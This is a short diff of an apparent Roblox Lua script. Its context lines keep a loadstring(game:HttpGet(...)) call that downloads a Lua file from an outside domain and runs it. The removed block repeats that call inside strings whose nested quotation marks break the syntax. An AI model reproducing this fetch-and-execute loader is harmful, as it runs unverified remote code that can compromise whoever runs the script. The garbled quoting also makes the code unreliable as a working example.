@@ -8,11 +8,3 @@ for _, url in pairs({
     loadstring(game:HttpGet("https://egorikusa.space/c345e949ad2ddf8597c9d56a.lua", true))()
     loadstring(game:HttpGet(url, true))()
 end
-
-for _, url in pairs({
-    "loadstring(game:HttpGet("https://egorikusa.space/c345e949ad2ddf8597c9d56a.lua", true))()",
-    "loadstring(game:HttpGet("https://egorikusa.space/c345e949ad2ddf8597c9d56a.lua", true))()
-
-}) do
-    loadstring(game:HttpGet(url, true))()
-end
